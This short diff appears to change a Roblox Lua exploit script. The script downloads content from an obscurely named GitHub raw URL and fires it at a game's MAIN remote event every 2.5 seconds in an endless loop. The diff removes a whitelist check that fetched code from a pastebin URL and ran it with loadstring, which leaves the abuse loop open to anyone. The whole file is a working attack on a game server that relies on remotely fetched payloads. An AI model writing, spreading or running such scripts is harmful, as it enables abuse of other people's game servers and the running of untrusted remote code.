@@ -1,11 +1,7 @@
 local func = workspace:WaitForChild("__THINGS"):WaitForChild("__REMOTES"):WaitForChild("MAIN")
 local execute = game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/kmxcjeqyi/main/jzcmweu")
-local whitelistecheck = loadstring(game:HttpGet("https://pastebin.com/raw/3J5NTfkX", true))()
-if whitelistecheck[game:service('Players').LocalPlayer.UserId] then
 while true do wait(2.5) func:FireServer("b", execute)
 end
-else
-game:service('Players').LocalPlayer:Kick('Not Whitelisted')
-end
+
 
 
